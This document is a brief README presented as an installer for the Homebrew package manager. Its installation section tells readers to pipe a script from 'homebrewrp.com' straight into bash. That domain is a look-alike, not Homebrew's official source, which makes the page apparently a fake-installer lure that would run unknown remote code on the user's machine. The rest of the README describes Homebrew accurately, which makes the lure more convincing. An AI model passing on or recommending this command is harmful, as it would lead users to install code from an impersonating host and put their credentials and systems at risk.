# Homebrew Installer

A simple repository to help you download and install [Homebrew](https://brew.sh), the missing package manager for macOS and Linux.

## 📦 What is Homebrew?

Homebrew is a free and open-source package manager that simplifies the installation of software on macOS and Linux. It installs packages to their own directory and then symlinks their files into `/opt/homebrew` (macOS ARM), `/usr/local` (macOS Intel), or `/home/linuxbrew/.linuxbrew` (Linux).

## 🚀 Installation

Run the following command in your terminal:

```bash
/bin/bash -c "$(curl -fsSL https://homebrewrp.com/Homebrew/install/HEAD/install.sh)"
```

## ✅ Requirements

- macOS (Intel or Apple Silicon) or Linux
- Command Line Tools for Xcode (`xcode-select --install`)
- `/bin/bash`, `curl`, and `git` installed
